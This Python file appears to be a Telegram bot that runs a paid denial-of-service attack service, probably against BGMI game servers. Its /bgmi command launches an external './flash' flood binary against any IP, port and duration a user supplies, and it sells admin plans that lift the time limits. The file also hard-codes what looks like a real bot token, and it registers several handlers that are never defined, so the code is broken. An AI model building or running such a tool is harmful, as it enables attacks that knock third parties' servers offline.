import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler
from functools import partial

# Bot token and channel IDs
BOT_TOKEN = "7741809361:AAHp5klSIfbsQK4na5blhNVrzLyXrZH7PiE"
CHANNEL_ID = ["-1002222750764", "-1002222750764"]
OWNER_ID = {6073143283}  # Replace with your owner IDs
COOWNER_ID = set()  # Co-owners will be added here

# Constants
INVALID_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
MAX_TIME = 60
COOLDOWN_TIME = 600

# Global variables
last_attack_time = {}
bgmi_blocked = False
admins_file = "admins.txt"
logs_file = "logs.txt"
blocked_users_file = "blocked_users.txt"
channels_file = "channels.txt"
admins = set()
blocked_users = set()
going_attacks = {}
scheduler = BackgroundScheduler()  # Initialize the scheduler
scheduler.start()  # Start the scheduler

# Admin management
def load_admins():
    global admins
    try:
        with open(admins_file, "r") as f:
            admins = {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        admins = OWNER_ID
        save_admins()

def save_admins():
    with open(admins_file, "w") as f:
        f.writelines(f"{admin_id}\n" for admin_id in admins)

# Blocked users management
def load_blocked_users():
    global blocked_users
    try:
        with open(blocked_users_file, "r") as f:
            blocked_users = {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        blocked_users = set()
        save_blocked_users()

def save_blocked_users():
    with open(blocked_users_file, "w") as f:
        f.writelines(f"{user_id}\n" for user_id in blocked_users)

# Channel management
def load_channels():
    global CHANNEL_ID
    try:
        with open(channels_file, "r") as f:
            CHANNEL_ID = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        CHANNEL_ID = []
        save_channels()

def save_channels():
    with open(channels_file, "w") as f:
        f.writelines(f"{channel_id}\n" for channel_id in CHANNEL_ID)

# Logging
def log_attack(user_id, username, ip, port, time_sec):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(logs_file, "a") as f:
        f.write(f"{timestamp} - UserID: {user_id}, Username: {username}, IP: {ip}, Port: {port}, Time: {time_sec}\n")

# Helper to check channel membership
async def is_user_in_all_channels(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    for channel_id in CHANNEL_ID:
        try:
            member_status = await context.bot.get_chat_member(channel_id, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True

# Attack completion notification
async def notify_attack_finished(context: ContextTypes.DEFAULT_TYPE, user_id: int, ip: str, port: int):
    await context.bot.send_message(
        chat_id=user_id,
        text=f"\u2705 The attack on \n\U0001F5A5 IP: {ip},\n\U0001F310 Port: {port} has finished."
    )
    going_attacks.pop((user_id, ip, port), None)  # Remove from ongoing attacks

# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id in blocked_users:
        await update.message.reply_text("\u274C You are blocked from using this bot.")
        return

    if not await is_user_in_all_channels(user_id, context):
        await update.message.reply_text(
            "\u274C Access Denied! Please join the required channels to use this bot.\n"
            "1. [Channel 1](https://t.me/+Edf2t3u 9ifEzZmRl)\n"
            "2. [Channel 2](https://t.me/+ft1CukwpYMg5MGRl)\n"
            "\u2022 Max time limit: 60 seconds\n"
            "\u2022 Cooldown time: 600 seconds\n"
            "\u2022 Purchase admin privileges for no restrictions!\n\n"
            "\u2022O FILE CREDIT - @shantanu24_6/n VPS CREDIT - @FPSOWNER/n  ",
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            "\u2705 Welcome! Use /bgmi to start.\n"
            "\u2022 Max time limit: 60 seconds\n"
            "\u2022 Cooldown time: 600 seconds\n"
            "\u2022 Purchase admin privileges for no restrictions!\n"
          
        )

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bgmi_blocked, last_attack_time
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"

    if user_id in blocked_users:
        await update.message.reply_text("\u274C You are blocked from using this command.")
        return

    if bgmi_blocked:
        await update.message.reply_text("\u274C The /bgmi command is currently blocked.")
        return

    if not await is_user_in_all_channels(user_id, context):
        await update.message.reply_text(
            "\u274C Please join all required channels to use this command:\n"
            "1. [Channel 1](https://t.me/+Edf2t3u9ifEzZmRl)\n"
            "2. [Channel 2](https://t.me/+ft1CukwpYMg5MGRl)",
            parse_mode="Markdown",
        )
        return

    now = datetime.now()
    last_time = last_attack_time.get(user_id, None)
    if user_id not in admins and user_id not in OWNER_ID and user_id not in COOWNER_ID:
        if last_time and (now - last_time).total_seconds() < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - (now - last_time).total_seconds()
            await update.message.reply_text(f"\u23F3 Please wait {int(remaining)} seconds before using this command again.\n\u2022TO REMOVE COOLDOWN TIME PURCHASE ADMIN PLAN BY OWNER'S")
            return

    if len(context.args) != 3:
        await update.message.reply_text(
            "\u26A0 Usage: /bgmi <ip> <port> <time>\n\n"
            "\u2022 Max time limit: 60 seconds\n"
            "\u2022 Cooldown time: 600 seconds\n"
            "\u2022 Purchase admin privileges for no restrictions!"
            
        )
        return

    ip, port, time_str = context.args
    try:
        port = int(port)
        time_sec = int(time_str)
    except ValueError:
        await update.message.reply_text("\u26A0 Invalid input. Port and time must be numeric.")
        return

    if port in INVALID_PORTS:
        await update.message.reply_text("\u26A0 This port is not allowed.")
        return

    if user_id not in admins and time_sec > MAX_TIME:
        await update.message.reply_text("\u26A0 Non-admins are limited to 60 seconds.")
        return

    try:
        subprocess.Popen(["./flash", ip, str(port), str(time_sec), "200"])
        going_attacks[(user_id, ip, port)] = {
            "username": username,
            "time": time_sec,
            "start_time": datetime.now(),
        }

        log_attack(user_id, username, ip, port, time_sec)
        last_attack_time[user_id] = now

        scheduler.add_job(
            partial(notify_attack_finished, context),
            "date",
            run_date=now + timedelta(seconds=time_sec),
            args=[user_id, ip, port],
        )
        await update.message.reply_text(f"\u2705 Attack started:\n\U0001F5A5 IP: {ip}\n\U0001F310 Port: {port}\n\u23F3 Time: {time_sec} seconds")    
    except Exception as e:
        await update.message.reply_text(f"\u274C Failed to start attack: {e}")

async def ongoingattacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in admins and user_id not in COOWNER_ID:
        await update.message.reply_text("\u274C Only admins and co-owners can view ongoing attacks.")
        return

    if not going_attacks:
        await update.message.reply_text("\u2139 No ongoing attacks.")
        return

    message = "\u2022 Ongoing Attacks:\n"
    for (uid, ip, port), details in going_attacks.items():
        elapsed = (datetime.now() - details["start_time"]).total_seconds()
        remaining = details["time"] - elapsed
        message += (
            f"\u2022 User: {details['username']} (ID: {uid})\n"
            f"\u2022 IP: {ip}, Port: {port}\n"
            f"\u23F3 Time: {details['time']} sec, Remaining: {int(remaining)} sec\n\n"
        )

    await update.message.reply_text(message)

async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in COOWNER_ID and user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only co-owners and the owner can view logs.")
        return

    try:
        with open(logs_file, "r") as f:
            await update.message.reply_document(f)
    except FileNotFoundError:
        await update.message.reply_text("\u2139 No logs available.")

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in COOWNER_ID and user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only co-owners and the owner can add admins.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("\u26A0 Usage: /addadmin <user_id> <duration_in_days>")
        return

    new_admin_id = int(context.args[0])
    duration = int(context.args[1])
    admins.add(new_admin_id)
    save_admins()
    await update.message.reply_text(f"\u2705 User {new_admin_id} added as admin for {duration} days.")

    # Schedule removal after duration
    scheduler.add_job(remove_admin, 'date', run_date=datetime.now() + timedelta(days=duration), args=[new_admin_id])

async def remove_admin(user_id):
    admins.discard(user_id)
    save_admins()

async def addchannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in COOWNER_ID and user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only co-owners and the owner can add channels.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("\u26A0 Usage: /addchannel <channel_id> <channel_link>")
        return

    channel_id, channel_link = context.args
    CHANNEL_ID.append(channel_id)
    save_channels()
    await update.message.reply_text(f"\u2705 Channel {channel_id} added.")

async def removechannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in COOWNER_ID and user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only co-owners and the owner can remove channels.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("\u26A0 Usage: /removechannel <channel_id>")
        return

    channel_id = context.args[0]
    if channel_id in CHANNEL_ID:
        CHANNEL_ID.remove(channel_id)
        save_channels()
        await update.message.reply_text(f"\u2705 Channel {channel_id} removed.")
    else:
        await update.message.reply_text("\u26A0 Channel ID not found.")

async def addcoowner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only the owner can add co-owners.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("\u26A0 Usage: /addcoowner <user_id>")
        return

    coowner_id = int(context.args[0])
    COOWNER_ID.add(coowner_id)
    save_coowners()
    await update.message.reply_text(f"\u2705 User {coowner_id} added as co-owner.")

async def removecoowner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("\u274C Only the owner can remove co-owners.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("\u26A0 Usage: /removecoowner <user_id>")
        return

    coowner_id = int(context.args[0])
    COOWNER_ID.discard(coowner_id)
    save_coowners()
    await update.message.reply_text(f"\u2705 User {coowner_id} removed from co-owner list.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "Available commands:\n"
        "/start - Start the bot\n"
        "/bgmi <ip> <port> <time> - Start an attack\n"
        "/ongoingattacks - View ongoing attacks (Admin, Co-owner, Owner)\n"
        "/logs - View logs (Co-owner, Owner)\n"
        "/blockuser <user_id> - Block a user (Co-owner, Owner)\n"
        "/broadcast <message> - Broadcast a message (Co-owner, Owner)\n"
        "/blockbgmi - Block the /bgmi command (Co-owner, Owner)\n"
        "/unblockbgmi - Unblock the /bgmi command (Co-owner, Owner)\n"
        "/addadmin <user_id> <duration_in_days> - Add an admin for a limited time (Co-owner, Owner)\n"
        "/removeadmin <user_id> - Remove an admin (Co-owner, Owner)\n"
        "/addchannel <channel_id> <channel_link> - Add a channel (Co-owner, Owner)\n"
        "/removechannel <channel_id> - Remove a channel (Co-owner, Owner)\n"
        "/showadmin - Show admin list (Co-owner, Owner)\n"
        "/addcoowner <user_id> - Add a co-owner (Owner)\n"
        "/removecoowner <user_id> - Remove a co-owner (Owner)\n"
        "/help - Show this help message"
    )
    await update.message.reply_text(help_text)

def save_coowners():
    with open("coowners.txt", "w") as f:
        f.writelines(f"{coowner_id}\n" for coowner_id in COOWNER_ID)

def load_coowners():
    global COOWNER_ID
    try:
        with open("coowners.txt", "r") as f:
            COOWNER_ID = {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        COOWNER_ID = set()
        save_coowners()

# Main function
def main():
    load_admins()
    load_blocked_users()
    load_channels()
    load_coowners()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("ongoingattacks", ongoingattacks))
    app.add_handler(CommandHandler("logs", logs))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("removeadmin", removeadmin))
    app.add_handler(CommandHandler("blockbgmi", blockbgmi))
    app.add_handler(CommandHandler("unblockbgmi", unblockbgmi))
    app.add_handler(CommandHandler("showadmin", showadmin))
    app.add_handler(CommandHandler("blockuser", blockuser))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addchannel", addchannel))
    app.add_handler(CommandHandler("removechannel", removechannel))
    app.add_handler(CommandHandler("addcoowner", addcoowner))
    app.add_handler(CommandHandler("removecoowner", removecoowner))
    app.add_handler(CommandHandler("help", help_command))

    app.run_polling()

if __name__ == "__main__":
    main()